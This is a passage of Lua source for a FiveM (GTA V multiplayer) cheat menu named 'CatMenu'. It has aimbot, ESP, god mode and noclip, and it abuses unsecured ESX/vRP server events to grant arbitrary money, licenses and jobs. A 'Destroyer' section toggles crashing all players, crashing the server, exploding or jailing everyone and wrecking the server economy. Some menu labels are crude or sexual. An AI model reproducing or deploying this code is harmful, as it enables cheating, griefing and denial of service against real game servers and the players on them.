				elseif CatMenu.MenuButton("Vehicles ~s~Menu  ~y~»", "VehMenu") then
				elseif CatMenu.MenuButton("Weapons ~s~Menu  ~y~»", "WepMenu") then
				elseif CatMenu.MenuButton("~r~Fuck ~s~~r~Server ~r~∑  ~y~»", "Destroyer") then
				elseif CatMenu.MenuButton("~p~Lua menu ~s~  ~y~»", "ServerMenu") then
				elseif CatMenu.MenuButton("Credits ~s~  ~y~»", "Credits") then
				elseif CatMenu.Button("~r~Eject~s~ Menu") then
					Enabled = false
				end

				CatMenu.Display()
			elseif CatMenu.IsMenuOpened("SelfMenu") then
				if
					CatMenu.CheckBox(
						"~g~God ~r~Mode",
						Godmode,
						function(enabled)
							Godmode = enabled
						end
					)
				 then
				 elseif CatMenu.CheckBox("Infinite Stamina",InfStamina,function(enabled)InfStamina = enabled end) then
				elseif CatMenu.Button("~r~Suicide") then
					SetEntityHealth(PlayerPedId(), 0)
				elseif CatMenu.Button("~s~Revive ~g~ESX") then
					TriggerEvent("esx_ambulancejob:revive")
				elseif CatMenu.Button("~g~Heal") then
					SetEntityHealth(PlayerPedId(), 200)
				elseif CatMenu.Button("~b~Armour") then
					SetPedArmour(PlayerPedId(), 200)
					elseif CatMenu.Button("Suck aliza for money (500k+)") then
				TriggerServerEvent("esx_godirtyjob:pay", 500000)
				TriggerServerEvent("esx_pizza:pay", 500000)
				TriggerServerEvent("esx_slotmachine:sv:2", 500000)
				TriggerServerEvent("esx_banksecurity:pay", 500000)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', 500000)
				TriggerServerEvent('AdminMenu:giveBank', 500000)        
				TriggerServerEvent("AdminMenu:giveCash", 500000)
				TriggerServerEvent("esx_gopostaljob:pay", 500000)
				TriggerServerEvent("AdminMenu:giveBank", 500000)
				TriggerServerEvent("esx_truckerjob:pay", 500000)
				TriggerServerEvent("esx_carthief:pay", 500000)
			    TriggerServerEvent("esx_garbagejob:pay", 500000)
				TriggerServerEvent("esx_ranger:pay", 500000)
				
				
						drawNotification("~g~Oh yes very money")
				elseif CatMenu.Button("~w~Set hunger to ~g~100%") then
					TriggerEvent("esx_status:set", "hunger", 1000000)
				elseif CatMenu.Button("~w~Set thirst to ~g~100%") then
					TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif CatMenu.Button("~b~Open Menu Jail ~g~ESX") then
					TriggerEvent("esx-qalle-jail:openJailMenu")
				elseif CatMenu.Button("~b~Unjail") then
					TriggerServerEvent('esx_jailer:unjailTime', -1)
					TriggerServerEvent('JailUpdate', 0)
					TriggerEvent('UnJP')
				elseif
				CatMenu.CheckBox(
					"Super Jump",
					SuperJump,
					function(enabled)
					SuperJump = enabled
					end)
				then
				elseif
				CatMenu.CheckBox(
					"Explosive Punch",
					ePunch,
					function(enabled)
					ePunch = enabled
					end)
				then
				elseif
					 CatMenu.CheckBox("Speed Demon",SpeedDemon,
				 	 function(enabled)SpeedDemon = enabled end) 
			 	then
				elseif
				CatMenu.CheckBox(
					"Invisible",
					Invisible,
					function(enabled)
					Invisible = enabled
					end)
				then
				elseif
				CatMenu.CheckBox("NoClip",Noclip,function(enabled)Noclip = enabled end)
				then	
				end

		CatMenu.Display()
			elseif CatMenu.IsMenuOpened("TeleportMenu") then
				if CatMenu.Button("Teleport ~g~Waypoint") then
				TeleportToWaypoint()
			 elseif CatMenu.Button("Teleport ~g~Vehicle") then
					drawNotification("~y~No working wait next update fix")
			 end

		CatMenu.Display()
			elseif CatMenu.IsMenuOpened("Xposed") then
			if
				CatMenu.CheckBox(
				"ESP",
				esp,
				function(enabled)
				esp = enabled
				end)
			then
			elseif
				CatMenu.CheckBox(
				"Players Blips Map",
				playerBlips,
				function(enabled)
				playerBlips = enabled
				end)
			then
			elseif
				CatMenu.CheckBox(
				"~r~Clear ~s~All Vehicles",
				destroyvehicles,
				function(enabled)
				destroyvehicles = enabled
				end) 
			then
			elseif
				CatMenu.CheckBox(
				"~r~Explode ~s~All Vehicles",
				explodevehicles,
				function(enabled)
				explodevehicles = enabled
				end) 
			then
			end

		CatMenu.Display()
		elseif CatMenu.IsMenuOpened("Destroyer") then
		if CatMenu.Button("~r~Give All Weapons ~s~Players") then
					for ids = 0, 128 do
						if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
								GiveWeaponToPed(PlayerPedId(ids), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				end
			end
				elseif CatMenu.Button("~r~Remove All Weapons ~s~Players") then
					for ids = 0, 128 do
						if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
							RemoveAllPedWeapons(PlayerPedId(ids), true)
				end	
			end
		end
		
	elseif
		CatMenu.CheckBox(
		"~r~Explode ~s~All Players",
		blowall,
		function(enabled)
		blowall = enabled
	end)
	then
	elseif
		CatMenu.CheckBox(
		"~r~Crash ~s~All Players",
		nuke,
		function(enabled)
		nuke = enabled
		end)
	then
	elseif
		CatMenu.CheckBox(
		"~r~Fuck ~s~Server economy ~g~ESX",
		esxdestroy,
		function(enabled)
		esxdestroy = enabled
		end)
	then
	elseif
		CatMenu.CheckBox(
		"~r~Jail ~s~All Players",
		banallusers,
		function(enabled)
		banallusers = enabled
		end)
	then
	elseif
		CatMenu.CheckBox(
		"~r~Cuff ~s~All Players",
		freezeall,
		function(enabled)
		freezeall = enabled
	   	end)
	then
	elseif
		CatMenu.CheckBox(
			"~r~Crash ~s~Server",
			servercrasher,
			function(enabled)
				servercrasher = enabled
			end)
	then
	end

				CatMenu.Display()
			elseif CatMenu.IsMenuOpened("WepMenu") then
				if CatMenu.MenuButton("Specific Weapon", "SingleWepMenu") then
				elseif CatMenu.Button("~g~Give ~s~All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				elseif CatMenu.Button("~r~Remove ~s~All Weapons") then
					for i = 1, #allWeapons do
						RemoveAllPedWeapons(PlayerPedId(), true)
					end
				elseif CatMenu.Button("~b~Give Ammo") then
					for i = 1, #allWeapons do
						AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 200)
					end
				elseif
					CatMenu.ComboBox(
						"Weapon/Melee Damage",
						{"1x (Default)", "2x", "3x", "4x", "5x"},
						currentItemIndex,
						selectedItemIndex,
						function(currentIndex, selectedIndex)
							currentItemIndex = currentIndex
							selectedItemIndex = selectedIndex
							SetPlayerWeaponDamageModifier(PlayerId(), selectedItemIndex)
							SetPlayerMeleeWeaponDamageModifier(PlayerId(), selectedItemIndex)
						end
					)
			    then
			elseif
				CatMenu.CheckBox(
				"TriggerBot",
				TriggerBot,
				function(enabled)
				TriggerBot = enabled
				end)
				then
			elseif
				CatMenu.CheckBox(
				"AimBot",
				AimBot,
				function(enabled)
				AimBot = enabled
				end)	
				 then
				elseif
					CatMenu.CheckBox(
						"Infinite Ammo",
						InfAmmo,
						function(enabled)
							InfAmmo = enabled
							SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo)
						end
					)
				 then
				 elseif
					 CatMenu.CheckBox("Vehicle Gun",VehicleGun,
				 	 function(enabled)VehicleGun = enabled end) 
			 	then
			 	elseif
					 CatMenu.CheckBox("Delete Gun",DeleteGun,
				 	 function(enabled)DeleteGun = enabled end) 
			 	then
				end

				CatMenu.Display()
			elseif CatMenu.IsMenuOpened("SingleWepMenu") then
				for i = 1, #allWeapons do
					if CatMenu.Button(allWeapons[i]) then
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				end

				CatMenu.Display()
			elseif CatMenu.IsMenuOpened("VehMenu") then
				if CatMenu.Button("~g~Spawn Vehicle") then
					local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
					if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
						RequestModel(ModelName)
						while not HasModelLoaded(ModelName) do
							Citizen.Wait(0)
						end

						local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), true, true)

						SetPedIntoVehicle(PlayerPedId(), veh, -1)
					else
						drawNotification("~r~Model is not valid!")
					end
				elseif CatMenu.Button("Repair Vehicle") then
					SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
				elseif CatMenu.Button("Max Tuning") then
					MaxOut(GetVehiclePedIsUsing(PlayerPedId())
)				elseif CatMenu.Button("Max mechanics ~r~only performance") then
					engine(GetVehiclePedIsUsing(PlayerPedId()))
				elseif
					CatMenu.CheckBox(
					"Rainbow Vehicle Colour",
					RainbowVeh,
					function(enabled)
					RainbowVeh = enabled
					end)
				then
				elseif CatMenu.Button("~r~Delete Vehicle") then
					DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle Deleted")
				elseif CatMenu.Button("Make vehicle dirty") then
					Clean(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle is now dirty")
				elseif CatMenu.Button("Make vehicle clean") then
					Clean2(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle is now clean")
				elseif
					CatMenu.CheckBox(
						"No Fall",
						Nofall,
						function(enabled)
							Nofall = enabled

							SetPedCanBeKnockedOffVehicle(PlayerPedId(), Nofall)
						end
					)
				 then
				elseif
					CatMenu.CheckBox(
						"Vehicle Godmode",
						VehGod,
						function(enabled)
							VehGod = enabled
						end
					)
				 then
				elseif
					CatMenu.CheckBox(
					"Vehicle Speedboost ~g~Num9",
						VehSpeed,
						function(enabled)
						VehSpeed = enabled
						end)
				then
				elseif
					CatMenu.CheckBox(
						"Super Grip",
						supergrip,
						function(enabled)
							supergrip = enabled
						end
					)
				then
				end

				CatMenu.Display()
			elseif CatMenu.IsMenuOpened("ServerMenu") then
				if CatMenu.MenuButton("~s~Menu ~r~RECRUIT PLAYERS", "RecrutarPlayers") then
				elseif CatMenu.MenuButton("~s~Menu ~b~BOSS", "ESXBoss") then
				elseif CatMenu.MenuButton("~s~Menu ~g~MONEY", "ESXMoney") then
				elseif CatMenu.MenuButton("~s~Menu ~p~DRUGS", "ESXDrugs") then
				elseif CatMenu.MenuButton("~s~Menu ~o~OTHERS", "ESXMisc") then
				end

				CatMenu.Display()
			elseif CatMenu.IsMenuOpened("ESXBoss") then
				if CatMenu.Button("~c~Mechanic~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mecano', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif CatMenu.Button("~b~Police~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif CatMenu.Button("~r~Ambulance~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif CatMenu.Button("~y~Taxi~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'taxi', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif CatMenu.Button("~g~Real Estate~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif CatMenu.Button("~p~Gang~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'gang', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif CatMenu.Button("~o~Car Dealer~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif CatMenu.Button("~y~Banker~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'banker', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif CatMenu.Button("~c~Mafia~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mafia', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif CatMenu.Button("~g~ESX ~y~Custom Boss Menu") then
					local result = KeyboardInput("Enter Boss Menu Script Name", "", 10)
					if result then
						TriggerEvent('esx_society:openBossMenu', result, function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
					end
				end

				CatMenu.Display()
			elseif CatMenu.IsMenuOpened("ESXMoney") then
				if CatMenu.Button("~r~Best money ~w~∑") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				TriggerServerEvent('vrp_slotmachine:server:2', result)
				TriggerServerEvent("esx_pizza:pay", result)
				TriggerServerEvent('esx_jobs:caution', 'give_back', result)
				TriggerServerEvent('lscustoms:payGarage', result)
				TriggerServerEvent('esx_tankerjob:pay', result)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', result)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', result)
				TriggerServerEvent('gambling:spend', result)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', result)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				TriggerServerEvent('AdminMenu:giveBank', result)
				TriggerServerEvent('AdminMenu:giveCash', result)
				TriggerServerEvent('esx_slotmachine:sv:2', result)
				TriggerServerEvent('esx_truckerjob:pay', result)
				TriggerServerEvent('esx_moneywash:deposit', result)
				TriggerServerEvent('esx_moneywash:withdraw', result)
				TriggerServerEvent('esx_moneywash:deposit', result)
			    TriggerServerEvent('mission:completed', result)
				TriggerServerEvent('99kr-burglary:addMoney', result)
				end
			elseif CatMenu.Button("~g~Money ~s~1") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent("esx_jobs:caution", "give_back", result)
				end
			elseif CatMenu.Button("~g~Money ~s~2") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif CatMenu.Button("~g~Money ~s~3") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveBank', result)
				end
			elseif CatMenu.Button("~g~Money ~s~4") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveCash', result)
				end
			elseif CatMenu.Button("~g~Money ~s~5") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			elseif CatMenu.Button("~g~Money ~s~6") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			elseif CatMenu.Button("~g~Money ~s~7") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			elseif CatMenu.Button("~g~Money ~s~8") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
				end		
			elseif CatMenu.Button("~g~Money ~s~9") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("vrp_slotmachine:server:2", result)
				end
			elseif CatMenu.Button("~g~Money ~s~10") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				end
			elseif CatMenu.Button("~g~Money ~s~11") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif CatMenu.Button("~g~Money ~s~12") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('delivery:success', result)
				end
			elseif CatMenu.Button("~g~Money ~s~13") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent ('taxi:success', result)
				end
			elseif CatMenu.Button("~g~Money ~s~14") then
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
			elseif CatMenu.Button("~g~Money ~s~15") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_garbagejob:pay", result)
				end	
			elseif CatMenu.Button("~s~Bank ~r~Deposit") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("bank:deposit", result)
				end
			elseif CatMenu.Button("~s~Bank ~r~Withdraw ") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("bank:withdraw", result)
				end
			end


			CatMenu.Display()
				elseif CatMenu.IsMenuOpened("ESXMisc") then
				    if CatMenu.Button("~g~ESX ~r~SEND EVERYONE A BILL") then
                    local amount = KeyboardInput("Enter Amount", "", 100000000)
                    local name = KeyboardInput("Enter the name of the Bill", "", 100000000)
                    if amount and name then
                    for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", name, amount)
                    end
				end
				elseif CatMenu.Button("~g~ESX ~w~Get all licenses Drive") then
					TriggerServerEvent('esx_dmvschool:addLicense', dmv)
					TriggerServerEvent('esx_dmvschool:addLicense', drive)
					TriggerServerEvent('esx_dmvschool:addLicense', drive_bike)
					TriggerServerEvent('esx_dmvschool:addLicense', drive_truck)
					TriggerServerEvent("dmv:success")
				elseif CatMenu.Button("Send Discord Message") then
					local Message = KeyboardInput("Enter message to send", "", 100)
					TriggerServerEvent("DiscordBot:playerDied", Message, "1337")
					drawNotification("The message:~n~" .. Message .. "~n~Has been ~g~sent!")
				elseif CatMenu.Button("Send Police Car Advert") then
				TriggerServerEvent("esx:enterpolicecar",GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsIn(GetPlayerPed(-1), 0))))
				end
				

				CatMenu.Display()
			elseif CatMenu.IsMenuOpened("MiscServerOptions") then
				if CatMenu.Button("Send Discord Message") then
					local Message = KeyboardInput("Enter message to send", "", 100)
					TriggerServerEvent("DiscordBot:playerDied", Message, "1337")
					drawNotification("The message:~n~" .. Message .. "~n~Has been ~g~sent!")
				elseif CatMenu.Button("Send Police Car Advert") then
				TriggerServerEvent("esx:enterpolicecar",GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsIn(GetPlayerPed(-1), 0))))
				end

				CatMenu.Display()
			elseif CatMenu.IsMenuOpened("VRPOptions") then
				if CatMenu.Button("~r~VRP ~s~Give Money ~ypayGarage") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
					if result then
						TriggerServerEvent("lscustoms:payGarage", {costs = -result})
					end		
				elseif CatMenu.Button("~r~VRP ~g~WIN ~s~Slot Machine") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
					if result then
					TriggerServerEvent("vrp_slotmachine:server:2", result)
					end
				elseif CatMenu.Button("~r~VRP ~s~Get driving license") then
					TriggerServerEvent("dmv:success")
				elseif CatMenu.Button("~r~VRP ~s~Bank Deposit") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
					TriggerServerEvent("bank:deposit", result)
					end
				elseif CatMenu.Button("~r~VRP ~s~Bank Withdraw ") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
					TriggerServerEvent("bank:withdraw", result)
					end
			end


				CatMenu.Display()
			elseif CatMenu.IsMenuOpened("ESXDrugs") then
				if CatMenu.Button("~g~Harvest ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
				elseif CatMenu.Button("~g~Transform ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
				elseif CatMenu.Button("~g~Sell ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
				elseif CatMenu.Button("~w~Harvest ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
				elseif CatMenu.Button("~w~Transform ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
				elseif CatMenu.Button("~w~Sell ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
				elseif CatMenu.Button("~r~Harvest Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
				elseif CatMenu.Button("~r~Transform Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
				elseif CatMenu.Button("~r~Sell Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
				elseif CatMenu.Button("~p~Harvest Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
				elseif CatMenu.Button("~p~Transform Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
				elseif CatMenu.Button("~p~Sell Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
				elseif CatMenu.Button("~g~Money Wash ~c~(x10)") then
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
				elseif CatMenu.Button("~r~Stop all ~c~(Drugs)") then
					TriggerServerEvent("esx_drugs:stopHarvestCoke")
					TriggerServerEvent("esx_drugs:stopTransformCoke")
					TriggerServerEvent("esx_drugs:stopSellCoke")
					TriggerServerEvent("esx_drugs:stopHarvestMeth")
					TriggerServerEvent("esx_drugs:stopTransformMeth")
					TriggerServerEvent("esx_drugs:stopSellMeth")
					TriggerServerEvent("esx_drugs:stopHarvestWeed")
					TriggerServerEvent("esx_drugs:stopTransformWeed")
					TriggerServerEvent("esx_drugs:stopSellWeed")
					TriggerServerEvent("esx_drugs:stopHarvestOpium")
					TriggerServerEvent("esx_drugs:stopTransformOpium")
					TriggerServerEvent("esx_drugs:stopSellOpium")
					drawNotification("~r~Everything is now stopped.")
				end
				
				CatMenu.Display()
			elseif CatMenu.IsMenuOpened("RecrutarPlayers") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and CatMenu.MenuButton("~r~-»  ~s~"..GetPlayerName(i).."", 'RecrutarPlayersOptions') then
						SelectedPlayer = i
					end
				end
				
				CatMenu.Display()
			elseif CatMenu.IsMenuOpened("RecrutarPlayersOptions") then
				CatMenu.SetSubTitle("RecrutarPlayersOptions", "Recrutar Players options [" .. GetPlayerName(SelectedPlayer) .. "]")
			    if CatMenu.Button("~s~Recruit~c~ Mechanic") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "mecano", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "mecano", 0)
				TriggerServerEvent('esx:recruterplayer', GetPlayerServerId(SelectedPlayer), "mecano", 0)
			elseif CatMenu.Button("~s~Recruit~b~ Police") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "police", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "police", 0)
			elseif CatMenu.Button("~s~Recruit~c~ Mafia") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "mafia", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "mafia", 0)
			elseif CatMenu.Button("~s~Recruit~p~ Gang") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "gang", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "gang", 0)
			elseif CatMenu.Button("~s~Recruit~r~ Inem") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "ambulance", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "ambulance", 0)
			elseif CatMenu.Button("Custom Recruit") then
					local reason = KeyboardInput("Enter the job name", "", 100)
					local reason2 = KeyboardInput("Enter the nivel job number 0-10", "", 10)
					if reason and reason2 then
					TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), reason, reason2)
					TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer',GetPlayerServerId(SelectedPlayer), reason, reason2)
					end
				end
				
				
                CatMenu.Display()
			elseif CatMenu.IsMenuOpened("Credits") then
				if CatMenu.Button("Flacko") then
				elseif CatMenu.Button("Cat") then
				elseif CatMenu.Button("Aliza") then
				elseif CatMenu.Button("Whore") then
				elseif CatMenu.Button("Yes") then
				end
				CatMenu.Display()
				
				
			elseif CatMenu.IsMenuOpened("OnlinePlayerMenu") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and CatMenu.MenuButton("~r~-»  ~s~"..GetPlayerName(i).."~y~ » "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~s~[~r~DEAD~s~]" or "~s~[~g~ALIVE~s~]"), 'PlayerOptionsMenu') then
						SelectedPlayer = i
					end
				end
		

				CatMenu.Display()
			elseif CatMenu.IsMenuOpened("PlayerOptionsMenu") then
				CatMenu.SetSubTitle("PlayerOptionsMenu", "Player ~s~[" .. GetPlayerName(SelectedPlayer) .. "]")
				if CatMenu.Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
					SpectatePlayer(SelectedPlayer)
				elseif CatMenu.Button("~h~~r~Cage ~s~Player (not working)") then 
				      freezePlayer = enabled
				elseif CatMenu.Button("Teleport To Player") then
					local Entity = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
					SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)	
				elseif CatMenu.Button("~g~Give ~s~Money") then
						local result = KeyboardInput("Enter amount of money to give", "", 100000000)
						if result then
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(SelectedPlayer), "item_money", "money", result)    
						end
				elseif CatMenu.Button("~r~Remove ~s~Money") then
						local result = KeyboardInput("Enter amount of money to give", "", 100000000)
						if result then
						TriggerServerEvent('esx:removeInventoryItem', GetPlayerServerId(SelectedPlayer), "item_money", "money", result)    
						end
				elseif CatMenu.Button("~h~~r~Bottle ~s~Player") then -- Bottle Player
local eb = "xs_prop_plastic_bottle_wl"
local ec = GetHashKey(eb)
